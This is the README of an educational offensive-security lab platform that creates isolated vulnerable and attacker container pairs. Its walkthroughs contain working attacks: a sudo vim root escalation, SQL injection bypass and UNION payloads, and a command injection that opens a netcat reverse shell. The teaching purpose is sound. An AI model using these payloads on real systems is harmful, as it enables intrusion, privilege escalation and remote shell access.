# FlexiPwn

Plataforma educativa de ciberseguridad ofensiva que permite crear entornos de práctica aislados para estudiantes. Cada entorno es un par de contenedores (vulnerable + atacante) corriendo en una red interna privada, completamente separados del host y del resto de entornos.

El educador opera todo desde un REPL interactivo (`flexipwn daemon start`); los estudiantes solo necesitan SSH al contenedor atacante de su entorno.

---

## Arquitectura

FlexiPwn se organiza en 4 capas desacopladas:

```
┌─────────────────────────────────────────────────────────┐
│  Capa 4 — Administración                                │
│  CLI (Typer + Rich) · REPL · Persistencia (SQLite)      │
├─────────────────────────────────────────────────────────┤
│  Capa 3 — Motor de evaluación                           │
│  Reglas YAML · Targets atómicos y lógicos · Feedback    │
├─────────────────────────────────────────────────────────┤
│  Capa 2 — Monitoreo pasivo                              │
│  Filesystem · Procesos · Logs · Red (tcpdump)           │
├─────────────────────────────────────────────────────────┤
│  Capa 1 — Entornos virtualizados                        │
│  Docker rootless · Redes internas · Volúmenes aislados  │
└─────────────────────────────────────────────────────────┘
```

A nivel de ejecución, la Capa 4 corre como un daemon long-running con tres modos de interacción:

```
┌─────────────────────────────────────────────────────────────────┐
│ Daemon (un proceso long-running)                                │
│  ├── SuperMonitor (polling Docker, evalúa targets)              │
│  ├── DB SQLite (~/.flexipwn/flexipwn.db, scenarios/runs/events) │
│  └── Unix socket (~/.flexipwn/daemon.sock, modo --detach)       │
└─────────────────────────────────────────────────────────────────┘
        ▲                              ▲
        │ vía DB (lectura/escritura)   │ vía socket (REPL remoto)
        │                              │
┌────────────────┐              ┌────────────────────┐
│ flexipwn run/  │              │ flexipwn daemon    │
│ scenario/...   │              │ attach (REPL)      │
│ (CLI clásica)  │              │                    │
└────────────────┘              └────────────────────┘
```

Tres formas de hablar con el daemon:

1. **REPL foreground** — `flexipwn daemon start` abre un prompt interactivo donde el educador opera todo (`scenario list`, `run start`, etc.) y los eventos del monitor aparecen sobre el prompt en vivo.
2. **REPL attach** — el daemon corre en background (`--detach`); cualquier terminal conecta con `flexipwn daemon attach` y opera como si fuera el foreground. Múltiples attachs simultáneos están soportados.
3. **CLI clásica** — comandos one-shot (`flexipwn run list`, `flexipwn run show <id>`, etc.) que leen/escriben la DB directamente. Útiles para scripts y automatización.

---

## Requisitos

- Python 3.12 + [uv](https://github.com/astral-sh/uv)
- Docker Engine en modo **rootless** (Linux/WSL2) o Colima rootless (macOS)
- ~2 GB libres para imágenes (`nicolaka/netshoot` se descarga al primer run con red)

---

## Instalación

```bash
uv sync --all-extras
```

### Construir las 4 imágenes Docker

```bash
docker build -t flexipwn/vulnerable-sudo:latest docker/privesc/
docker build -t vuln-sqli-mysql                 docker/sqli-mysql/
docker build -t vuln-command-injection          docker/vuln-command-injection/
docker build -t flexipwn-attacker               docker/attacker/
```

---

## Quick start (modo aula con un estudiante)

```bash
# 1. Arrancar el daemon en foreground (abre el REPL)
uv run flexipwn daemon start
```

Dentro del REPL:

```
flexipwn> scenario load scenarios/privesc-demo.yaml
flexipwn> participant add                 # → muestra username + password
flexipwn> run start                       # wizard interactivo
                                          # → tabla escenarios, pick 1
                                          # → tabla participantes, pick 1
                                          # → panel SSH con host/puerto/clave
```

El educador comparte con el estudiante el comando SSH del panel. El daemon queda monitoreando: cuando el estudiante dispara los targets del escenario, aparecen sobre el prompt:

```
[run-abcd1234] ✓ Archivo .txt creado en directorio root
[run-abcd1234] Progreso: 2/3 (66%)
[run-abcd1234] ✓ ESCENARIO COMPLETADO
```

---

## Modo aula multi-estudiante (`--detach` + `attach`)

Para correr en un servidor sin terminal interactiva permanente:

```bash
# Terminal del servidor (una vez)
uv run flexipwn daemon start --detach
# → arranca en background, abre socket, redirige logs a ~/.flexipwn/daemon.log

# Terminal del educador (cuando lo necesite)
uv run flexipwn daemon attach
flexipwn> scenario list
flexipwn> participant add
flexipwn> run start                       # mismo wizard
flexipwn> exit                            # cierra el attach; el daemon sigue
```

Hacer `exit` o Ctrl+D del attach **no** detiene el daemon. Para detenerlo de verdad: `flexipwn daemon stop`.

### Asignación masiva (clase entera)

```bash
cat > /tmp/clase.yaml <<'EOF'
assignments:
  - scenario: "Privilege escalation via sudo vim"
    count: 5
  - scenario: "Command Injection → Reverse Shell"
    count: 3
EOF

# Desde el REPL (foreground o attach):
flexipwn> run batch-start /tmp/clase.yaml
# O desde CLI clásica:
uv run flexipwn run batch-start /tmp/clase.yaml --output reporte.csv
```

`reporte.csv` queda con columnas `scenario,username,env_id,ssh_port,ssh_password`. El educador lo distribuye a los estudiantes — cada uno tiene su entorno aislado y su contraseña SSH única.

---

## Comandos del REPL

```
scenario list                       — lista escenarios cargados
scenario load <yaml>                — carga un escenario YAML
scenario show <id>                  — detalle de un escenario

participant add                     — crea un participante (muestra password)
participant list                    — lista participantes
participant reset-password <user>   — genera nueva contraseña
participant remove <username>       — elimina (bloqueado si tiene runs activos)

run start                           — wizard: elige escenario + participante
run stop <env_id>                   — detiene un run y destruye su entorno
run reset <env_id>                  — recrea entorno preservando historial
run list                            — runs con contexto y estado
run show <env_id>                   — detalle del run + historial de intentos
run progress <env_id>               — estado de targets (snapshot)
run watch <env_id>                  — eventos en tiempo real (Ctrl+C sale)
run batch-start <yaml>              — crea runs masivos desde YAML

daemon status                       — runs activos en este daemon

help                                — esta ayuda
exit | quit                         — sale del REPL (en foreground también detiene el daemon)
```

Todos estos también existen como subcomandos CLI clásicos: `uv run flexipwn run list`, `uv run flexipwn scenario show <id>`, etc.

---

## Acceso del estudiante

El estudiante nunca ejecuta `docker` ni `flexipwn`. Solo entra por SSH al contenedor atacante con las credenciales que el educador le compartió:

```bash
ssh student-XXXXXX@<host> -p <puerto>
```

Dentro del atacante tiene `curl`, `nc` (openbsd), `nmap`, `bash`. **NO tiene `sudo`** — la metodología educativa requiere que el privesc, si aplica, ocurra dentro del contenedor vulnerable.

Para alcanzar el vulnerable usa el hostname del contenedor (resoluble vía DNS interno de Docker):

```bash
# Ejemplo (privesc — el vulnerable corre sshd):
ssh ctfuser@flexipwn-<env_id>-vulnerable        # password: ctfpassword

# Ejemplo (sqli/cmdinj — el vulnerable expone HTTP):
curl http://flexipwn-<env_id>-vulnerable:5001/...
```

El `<env_id>` se le entrega al estudiante junto con sus credenciales SSH.

---

## Escenarios incluidos

| Escenario | Categoría | Nivel | Vulnerable | Pista clave |
|---|---|---|---|---|
| `privesc-demo.yaml` — Privilege escalation via sudo vim | pwning | beginner | `flexipwn/vulnerable-sudo` (sshd + sudo NOPASSWD vim) | `ssh ctfuser@flexipwn-<env>-vulnerable` → `sudo vim -c ':!bash'` |
| `sqli-mysql-demo.yaml` — SQL injection login bypass | web | beginner | `vuln-sqli-mysql` (Flask + MySQL en `:5001`) | POST a `/` con `username=admin' OR '1'='1' -- ` |
| `command-injection-demo.yaml` — Command Injection → Reverse Shell | web | intermediate | `vuln-command-injection` (Flask en `:5001`, `/ping?host=`) | Inyectar `;nc <attacker> 4444 -e /bin/bash` y `nc -lvp 4444` en el atacante |

Todos usan `flexipwn-attacker` como imagen del atacante. El puerto interno **5001** se usa en todos los servicios HTTP por compatibilidad con macOS (puerto 5000 reservado por AirPlay).

---

## Walkthroughs de exploits

En cada walkthrough, las variables `<env_id>`, `<host>`, `<puerto>` y la `<password>` SSH del student vienen del panel SSH que el daemon imprime al ejecutar `run start` (o de la columna correspondiente en el CSV de `run batch-start`).

### 1. Privilege escalation via sudo vim

**Educador** (REPL):
```
flexipwn> scenario load scenarios/privesc-demo.yaml
flexipwn> participant add
flexipwn> run start              # elige privesc + el participante
                                 # apunta env_id, ssh_port, ssh_password
```

**Estudiante** (atacante → vulnerable → escalada → evidencia):
```bash
# 1. Entrar al atacante
ssh student-XXXXXX@<host> -p <ssh_port>
# (password del panel)

export ENV=run-xxxxxxxx          # tu env_id

# 2. Confirmar que NO tienes sudo en el atacante
sudo -l                          # → "may not run sudo"

# 3. Saltar al vulnerable (sshd dentro)
ssh ctfuser@flexipwn-${ENV}-vulnerable
# password: ctfpassword

# 4. Encontrar la vulnerabilidad: sudoers permite vim sin password
sudo -l
# (root) NOPASSWD: /usr/bin/vim

# 5. Escalar via shell-out de vim
sudo vim -c ':!bash'
# → caes en una shell root
id                               # uid=0(root)

# 6. Disparar los 3 targets del escenario
echo "pwned" > /root/flag.txt                    # → file_created /root/*.txt
echo "fake:x:9999:9999::/:/bin/bash" >> /etc/passwd   # → file_modified /etc/passwd
# (target 3 — process_running euid=0 cmd=bash ppid=vim ancestor=sudo —
#  ya se disparó al spawn del bash desde vim)
```

**Educador**:
```
flexipwn> run progress run-xxxxxxxx     # los 3 targets en ✓
                                        # → "ESCENARIO COMPLETADO" sobre el prompt
```

---

### 2. SQL injection login bypass

**Educador**:
```
flexipwn> scenario load scenarios/sqli-mysql-demo.yaml
flexipwn> participant add
flexipwn> run start              # elige SQLi + participante
```

**Estudiante** (dispara los 6 targets con dos payloads):
```bash
ssh student-XXXXXX@<host> -p <ssh_port>
export ENV=run-xxxxxxxx
VULN=flexipwn-${ENV}-vulnerable

# 1. Bypass clásico — dispara:
#    log_pattern OR.*1.*=.*1, log_pattern authentication_success,
#    network_payload OR.*1.*=.*1, network_payload SELECT.*users
curl -s -X POST "http://${VULN}:5001/" \
  --data-urlencode "username=admin' OR '1'='1' -- " \
  --data-urlencode "password=x"
# Respuesta: "Bienvenido admin, rol: admin"

# 2. UNION para extraer sensitive_data — dispara:
#    log_pattern SELECT.*sensitive_data,
#    network_payload FLAG{sql_injection_detected}
curl -s -X POST "http://${VULN}:5001/" \
  --data-urlencode "username=' UNION SELECT 1, secret_key, 'x', 'x' FROM sensitive_data -- " \
  --data-urlencode "password=x"
# Respuesta debe contener: "Bienvenido FLAG{sql_injection_detected}, rol: x"
```

**Educador**:
```
flexipwn> run progress run-xxxxxxxx     # 6/6 ✓
```

Detecciones cruzadas: el sniffer captura `port 3306` (queries Flask→MySQL) y los logs de MySQL + Flask son monitoreados por el `LogMonitor`. Por eso cada payload contribuye a múltiples targets.

---

### 3. Command Injection → Reverse Shell

**Educador**:
```
flexipwn> scenario load scenarios/command-injection-demo.yaml
flexipwn> participant add
flexipwn> run start              # elige CmdInj + participante
```

**Estudiante** (necesitas DOS sesiones SSH al mismo atacante):

**Terminal A — listener:**
```bash
ssh student-XXXXXX@<host> -p <ssh_port>
nc -lvp 4444
# se queda escuchando
```

**Terminal B — payload:**
```bash
ssh student-XXXXXX@<host> -p <ssh_port>
export ENV=run-xxxxxxxx

# Inyección en el endpoint /ping?host=
# nc-traditional dentro del vulnerable soporta -e (la atacante usa nc-openbsd para escuchar)
curl --get \
  --data-urlencode "host=;nc flexipwn-${ENV}-attacker 4444 -e /bin/bash" \
  "http://flexipwn-${ENV}-vulnerable:5001/ping"
# La conexión TCP saliente al puerto 4444 dispara network_connection
```

**Vuelve al Terminal A** — la reverse shell ya conectó:
```bash
# (sin prompt — eres root del vulnerable)
id                                   # uid=0(root)
echo "owned" > /root/win.txt         # → file_created /root/*.txt
```

**Educador**:
```
flexipwn> run progress run-xxxxxxxx     # 2/2 ✓
                                        # → "ESCENARIO COMPLETADO"
```

> **Tip**: si ves `ping: connect: Network is unreachable` antes del payload, es esperado — la red interna no tiene egress a internet, pero el `;` después del `ping` ejecuta la inyección igualmente.

---

## Arquitectura de red

Cada entorno levanta **dos redes Docker**:

- **Red interna** (`internal=true`, `flexipwn-{env_id}`) — conecta el vulnerable con el atacante. Sin egress al exterior; no hay routing al host.
- **Red externa** (`flexipwn-{env_id}-ext`) — conecta el atacante al host para que el SSH dinámicamente asignado en el rango `2200-2299` (configurable vía `FlexiPwnConfig`) sea alcanzable.

Garantías:
- El **vulnerable** solo es accesible desde el atacante de SU MISMO entorno (red interna única por env).
- El **atacante** del estudiante A no puede ver el vulnerable del estudiante B.
- El host puede entrar al atacante por `localhost:<puerto_ssh>`; el vulnerable no expone puertos al host (excepto en SQLi, que publica `5001:5001` para inspección por el educador).

---

## Principios de seguridad

FlexiPwn está diseñado para un servidor controlado por el educador en red de aula. Las garantías arquitecturales son:

- **Sin bind mounts del host** — los contenedores no tienen acceso a `/etc`, `/home`, `/root` ni ningún directorio del sistema.
- **Redes internas** — `internal=True` bloquea el tráfico saliente del vulnerable; el atacante puede recibir SSH desde el host pero no inicia conexiones outbound a la red del host.
- **Aislamiento por entorno** — cada entorno tiene su propia red Bridge; no hay comunicación lateral entre entornos.
- **Monitoreo pasivo** — la observación de procesos, sistema de archivos, logs y red usa APIs de Docker (`container.top()`, `container.diff()`) y captura tcpdump sin ejecutar comandos adicionales dentro del contenedor vulnerable.
- **Rollback transaccional** — si la creación falla a mitad, los recursos parcialmente creados se limpian automáticamente.
- **Docker rootless** — el daemon Docker corre sin privilegios de root en el host.

Consideraciones operacionales:

- **DB SQLite** (`~/.flexipwn/flexipwn.db`) — permisos `0600`. Almacena en plaintext las contraseñas SSH de los contenedores atacantes (efímeros) para que `flexipwn run show <env_id>` las recupere. Si el `.db` se filtra, comprometes esos contenedores efímeros, nunca el host. Cifrar añade complejidad desproporcionada para el contexto educativo.
- **Socket Unix del daemon** (`~/.flexipwn/daemon.sock`, modo `--detach`) — permisos `0600`. Solo el dueño del proceso puede attachar.
- **Estudiantes** — no tienen shell en el host. Cada uno tiene un username `student-XXXXXX` con su password única solo para SSH al contenedor atacante.
- **Atacante sin sudo** — el contenedor atacante NO da sudo al usuario SSH; cualquier escalada debe pasar por el contenedor vulnerable.

---

## Logs y troubleshooting

```bash
uv run flexipwn daemon status                  # PID + runs activos
uv run flexipwn daemon logs --tail 50          # últimos eventos del loop
tail -f ~/.flexipwn/daemon.log                 # streaming
```

Si el daemon se cuelga o queda inconsistente:
```bash
uv run flexipwn daemon stop
rm -f ~/.flexipwn/daemon.sock ~/.flexipwn/daemon.pid
uv run flexipwn daemon start --detach
```

Los entornos Docker activos se preservan al reiniciar el daemon — solo el SuperMonitor se reinicia y reconcilia.

---

## Testing

```bash
# Unitarios (sin Docker, ~3s)
uv run pytest -m "not integration"

# Integración (requiere Docker rootless, ~2-3 min)
uv run pytest -m integration

# Todos
uv run pytest
```

---

## Licencia

[GNU General Public License v3.0](LICENSE)
